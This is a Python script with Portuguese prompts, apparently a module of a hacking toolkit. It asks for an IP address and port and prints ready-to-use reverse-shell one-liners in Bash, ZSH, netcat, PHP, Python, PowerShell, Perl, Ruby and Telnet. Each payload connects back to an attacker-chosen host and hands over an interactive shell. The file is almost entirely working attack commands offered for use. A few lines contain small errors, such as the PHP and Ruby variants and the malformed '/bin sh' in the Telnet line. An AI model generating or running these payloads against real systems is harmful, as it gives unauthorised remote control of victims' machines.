# BIBLIOTESCAS
# =============================
from os import system
from time import sleep
# =============================
#
#
# Funçao do shell reverso


def fun_shell_rev():
    while True:
        system('clear') or None
        print("""
	      ╔═╗╦ ╦╔═╗╦  ╦    ╦═╗╔═╗╦  ╦╔═╗╦═╗╔═╗╔═╗
	      ╚═╗╠═╣║╣ ║  ║    ╠╦╝║╣ ╚╗╔╝║╣ ╠╦╝╚═╗║╣ 
	      ╚═╝╩ ╩╚═╝╩═╝╩═╝  ╩╚═╚═╝ ╚╝ ╚═╝╩╚═╚═╝╚═╝\n
	  - Um shell reverso é uma sessão de shell estabelecida em uma conexão iniciada a partir de uma máquina remota, não do host local.\n  
	    [01] - Bash
	    [02] - ZSH
	    [03] - NetCat
	    [04] - PHP
	    [05] - PYTHON
	    [06] - PowerShell
	    [07] - Perl
	    [08] - Ruby
	    [09] - Telnet
	    [10] - Menu
	    [99] - Sair""")

        cmd = str(input("===> "))

        if cmd == '1':
            system('clear') or None
            IP = str(input("\n[!] - Digite o endereço IP: "))
            PORTA = int(input("\n[!] - Digite a porta: "))
            print(f"""
	                              ╔╗ ╔═╗╔═╗╦ ╦
	                              ╠╩╗╠═╣╚═╗╠═╣
	                              ╚═╝╩ ╩╚═╝╩ ╩
	  
	                bash -c 'exec bash -i &>/dev/tcp/{IP}/{PORTA} <&1'\n""")
            input("[*] - Pressione ENTER para voltar...")
            fun_shell_rev()
            break

        elif cmd == '2':
            system("clear")
            IP = str(input("\n[!] - Digite o endereço IP: "))
            PORTA = int(input("\n[!] - Digite a porta: "))
            print(f"""
	                              ╔═╗╔═╗╦ ╦
	                              ╔═╝╚═╗╠═╣
	                              ╚═╝╚═╝╩ ╩
	  
	    zsh -c 'zmodload zsh/net/tcp && ztcp {IP} {PORTA} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'\n""")
            input("[*] - Pressione ENTER para voltar...")
            fun_shell_rev()
            break

        elif cmd == '3':
            system('clear')
            IP = str(input("[!] - Digite o endereço IP: "))
            PORTA = int(input("[!] - Digite a porta: "))
            print(f"""
	                              ╔╗╔╔═╗╔╦╗  ╔═╗╔═╗╔╦╗
	                              ║║║║╣  ║───║  ╠═╣ ║ 
	                              ╝╚╝╚═╝ ╩   ╚═╝╩ ╩ ╩ 
	        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORTA} >/tmp/f\n""")
            input("[*] - Pressione ENTER para voltar...")
            fun_shell_rev()
            break

        elif cmd == '4':
            system("clear")
            IP = str(input("[!] - Digite o endereço IP: "))
            PORTA = int(input("[!] - Digite a porta: "))
            print(f"""
	                              ╔═╗╦ ╦╔═╗
	                              ╠═╝╠═╣╠═╝
	                              ╩  ╩ ╩╩
	php -r '$sock=fsockopen(getenv("{IP}"),getenv("{PORTA}"));exec("/bin/sh -i <&3 >&3 2>&3");'\n""")
            input("[*] - Pressione ENTER para voltar...")
            fun_shell_rev()
            break

        elif cmd == '5':
            system('clear') or None
            IP = str(input("[!] - Digite o endereço IP: "))
            PORTA = int(input("[!] - Digite a porta: "))
            print(f"""
	                              ╔═╗╦ ╦╔╦╗╦ ╦╔═╗╔╗╔
	                              ╠═╝╚╦╝ ║ ╠═╣║ ║║║║
	                              ╩   ╩  ╩ ╩ ╩╚═╝╝╚╝
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORTA}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'\n"""
                  )
            input("[*] - Pressione ENTER para voltar...")
            fun_shell_rev()
            break

        elif cmd == '6':
            system('clear') or None
            print("""
	                      ╔═╗╔═╗╦ ╦╔═╗╦═╗╔═╗╦ ╦╔═╗╦  ╦  
	                      ╠═╝║ ║║║║║╣ ╠╦╝╚═╗╠═╣║╣ ║  ║  
	                      ╩  ╚═╝╚╩╝╚═╝╩╚═╚═╝╩ ╩╚═╝╩═╝╩═╝\n
	[!] - Adicione o endereço IP e a PORTA manualmente!!!\n
	powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORTA});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" \n
	  """)
            input("[*] - Pressione ENTER para voltar...")
            fun_shell_rev()
            break

        elif cmd == '7':
            system('clear') or None
            print("""
	                              ╔═╗╔═╗╦═╗╦  
	                              ╠═╝║╣ ╠╦╝║  
	                              ╩  ╚═╝╩╚═╩═╝\n
	[!] - Adicione o endereço IP e a PORTA manualmente!!!\n                          
	perl -e 'use Socket;$i="{IP}";$p={PORTA};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'\n""")
            input("[*] - Pressione ENTER para voltar...")
            fun_shell_rev()
            break

        elif cmd == '8':
            system('clear') or None
            print("""
	                              ╦═╗╦ ╦╔╗ ╦ ╦
	                              ╠╦╝║ ║╠╩╗╚╦╝
	                              ╩╚═╚═╝╚═╝ ╩\n
		       [!] - Adicione o endereço IP e a PORTA manualmente!!!\n
	ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["{IP}"],ENV["{PORTA}"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'\n""")
            input("[*] - Pressione ENTER para voltar...")
            fun_shell_rev()
            break

        elif cmd == '9':
            system('clear') or None
            IP = str(input("[!] - Digite o endereço IP: "))
            PORTA = int(input("[!] - Digite a porta: "))
            print(f"""
	                          ╔╦╗╔═╗╦  ╔╗╔╔═╗╔╦╗
	                           ║ ║╣ ║  ║║║║╣  ║ 
	                           ╩ ╚═╝╩═╝╝╚╝╚═╝ ╩ 
	    TF=$(mktemp -u); mkfifo $TF && telnet {IP} {PORTA} 0<$TF | /bin sh 1>$TF\n"""
                  )
            input("[*] - Pressione ENTER para voltar...")
            fun_shell_rev()
            break

        elif cmd == '10':
            break
        elif cmd == '99':
            print("Até logo....")
            exit()
        else:
            print("Comando Inválido!!!")
            sleep(2)
